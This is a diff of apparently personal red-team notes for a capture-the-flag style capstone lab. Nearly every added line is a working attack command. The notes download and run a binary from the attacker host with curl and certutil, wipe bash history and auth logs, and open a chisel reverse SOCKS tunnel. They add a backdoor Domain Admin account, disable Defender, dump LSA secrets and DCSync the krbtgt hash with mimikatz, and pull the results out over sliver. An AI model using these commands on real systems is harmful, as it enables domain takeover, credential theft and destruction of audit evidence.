@@ -184,15 +184,19 @@ sudo cp authorized_keys /root/.ssh/authorized_keys
 # If required
 ssh-keygen -f "/home/kali/.ssh/known_hosts" -R "10.200.117.12"
 ssh -i vpn_root.rsa root@10.200.117.12
-# Tools
-curl http://10.50.114.111:8443/VPN/VPN-update -o VPN-update
-# As root
-nohup ./VPN-update &
-
 # From AB
 ./chisel server -host 10.50.114.111 -p 20000 --reverse --socks5 -v
 # As www-data on the VPN
+# Tools
+# As root
 chmod +x *
+curl http://10.50.114.111:8443/VPN/VPN-update -o VPN-update
+nohup ./VPN-update &
+echo "" > /root/.bash_history && echo "" > /var/log/auth.log && kill -9 $$
+# Clear key as www-data
+echo "" > authb
+sudo cp authb /root/.ssh/authorized_keys
+# www-data
 nohup ./chisel client 10.50.114.111:20000  R:20001:socks &
 # comment sock4 ... and add to /etc/proxychains4.conf:
 socks5  127.0.0.1 20001
@@ -233,9 +237,41 @@ impacket-smbserver share $(pwd) -smb2support
 xcopy \\10.50.114.111\Share\Word.exe .
 .\Word.exe
 
+# Due to other users making either re-DCsync the DC and this is exploratory run of better Opsec and absolute full-worst-sysadmin-turned-bad-actor-DC-out-the-window-along-with-Opsec
 
+import-module ActiveDirectory
+New-ADUser -Name 'NVM2'
+Set-ADAccountPassword -Identity NVM2 -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
+Add-ADGroupMember -Identity "Domain Admins" -Members "NVM2"
+Enable-ADAccount -Identity NVM2
+net localgroup "Administrators" NVM2 /add 
+gpupdate /force
+# 
+proxychains4 xfreerdp /u:NVM2 /p:'p@ssw0rd1!' /v:10.200.117.102
+Set-MpPreference -DisableRealTimeMonitoring $true
+certutil.exe -urlcache -split -f http://10.50.114.111:8443/Tools/PowerView/PowerView.ps1
+certutil.exe -urlcache -split -f http://10.50.114.111:8443/mimikatz.zip
+certutil.exe -urlcache -split -f http://10.50.114.111:8443/kekeo.zip
+expand-archive .\mimikatz.zip
+expand-archive .\kekeo.zip
+cd C:\nvm\mimikatz\x64\
+.\mimikatz.exe
+# Mimkatz 
+# Remember to cycle through exfil and catagorise for data handling
+privilege::debug
+log
+token::elevate
+!+
+# We are DA so
+lsadump::lsa /patch
+exit 
+rm .\mimikatz.log
+# Then DC-Sync the parent domain
+lsadump::dcsync /user:corp.thereserve.loc\krbtgt /domain:thereserve.local
 
-
+# Exfil out with sliver
+download C:\\nvm\\mimikatz\\x64\\mimikatz.log
+mv 'C:\nvm\mimikatz\x64\mimikatz.log' /home/kali/RedTeamCapStoneChallenge/data/mimikatz/$CMD
 
 
 
